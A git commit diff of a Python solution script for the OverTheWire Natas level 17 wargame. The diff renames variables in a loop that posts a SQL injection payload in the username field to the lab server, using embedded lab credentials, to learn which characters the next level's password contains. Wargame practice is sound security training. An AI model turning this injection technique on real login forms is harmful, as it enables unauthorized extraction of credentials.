b3598dec413cee6553ea977eeec7a489e1786714
babaAH <31179945+babaAH@users.noreply.github.com>
2018-12-07 23:49:55 +0300

    code for natas 17

--- natas17.py
+++ natas17.py
@@ -1,15 +1,15 @@
 import requests
 
 URL = 'http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/'
-ss = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
 s = requests.Session()
-a = ''
+answer = ''
 
-for ch in ss:
+for ch in alphabet:
    data = {'username':'natas18" and password LIKE BINARY "%'+ch+'%" -- '}
    r = s.post(URL, data=data)
    if 'This user exists' in r.text:
        #print(ch)
-       a = a+ch
+       answer = answer+ch
 
-print(a)
+print(answer)
